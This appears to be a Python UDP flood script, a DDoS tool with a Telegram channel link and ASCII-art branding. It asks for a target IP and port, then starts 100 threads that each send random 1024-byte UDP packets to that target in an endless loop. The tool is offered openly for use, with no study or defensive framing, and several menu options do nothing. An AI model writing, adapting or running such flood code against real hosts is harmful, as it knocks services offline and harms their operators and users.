import os
import time
from random import randint
from colorama import Fore, init
from prettytable import PrettyTable

init(autoreset=True)

def show_menu():
    print("Welcome to the progress bar simulation!")

n = 0
r = ""

while n <= 100:
    print(r, f"{Fore.LIGHTCYAN_EX}%{n}")
    n += randint(1, 5)
    r += "="
    time.sleep(0.1)

time.sleep(3)
os.system("cls" if os.name == "nt" else "clear")

print(Fore.BLUE + "   https://t.me/MR_DITA")

print(Fore.LIGHTGREEN_EX + """
@@@@@@@@   @@@@@@@    @@@@@@    @@@@@@
@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@
@@!  @@@  @@!  @@@  @@!  @@@  !@@
!@!  @!@  !@!  @!@  !@!  @!@  !@!
@!@  !@!  @!@  !@!  @!@  !@!  !!@@!!
!@!  !!!  !@!  !!!  !@!  !!!   !!@!!!
!!:  !!!  !!:  !!!  !!:  !!!       !:!
:!:  !:!  :!:  !:!  :!:  !:!      !:!
:::: ::   :::: ::  ::::: ::  :::: ::
:: :  :   :: :  :    : :  :   :: : :
""")
print('')
print(Fore.BLUE + "   ")

print(Fore.LIGHTRED_EX + """
  ⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣤⣤
⠀⠀⢶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠠⠾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠛⠛⠋⠉⠀
⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⠏⢠⣿⡀⠀⠀⢹⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⣀⣙⣂⣠⠼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠛⠛⠛⠛⠻⠿⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")
print('')

# Define colors
lgn = "\033[92m"  
gn = "\033[92m"   
lrd = "\033[91m"  
cn = "\033[96m"   

t = PrettyTable([f'{cn}Number{lrd}', f'{cn}Information{lrd}'])
t.add_row([f'{lgn}1{lrd}', f'{gn}DDoS IP Set port >1{lrd}'])
t.add_row([f'{lgn}2{lrd}', f'{gn}DDoS IP Set La4 > 2{lrd}'])
t.add_row([f'{lgn}3{lrd}', f'{gn}Exe > 3{lrd}'])

print(t)
print('')
import socket
import threading
import os
import random
import time
import re

# Function to validate IP address
def is_valid_ip(ip):
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return re.match(pattern, ip) is not None

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Prompt user for target IP
target_ip = input("Please enter the target IP: ")   
if not is_valid_ip(target_ip):
    print("\033[91m[!] The entered IP is invalid!")
    exit()

# Prompt user for target port
target_port = input("Please enter the target port: ")
if not is_valid_port(target_port):
    print("\033[91m[!] The entered port is invalid!")
    exit()

target_port = int(target_port)  # Convert port to integer
num_threads = 100          

def attack():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  
    while True:
        client.sendto(bytes, (target_ip, target_port))
        print("\033[92m[+] Sending packet to {}:{}".format(target_ip, target_port))  

# Create and start threads
for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
    time.sleep(0.1)  

print("\033[91m[!] Attack has started!")
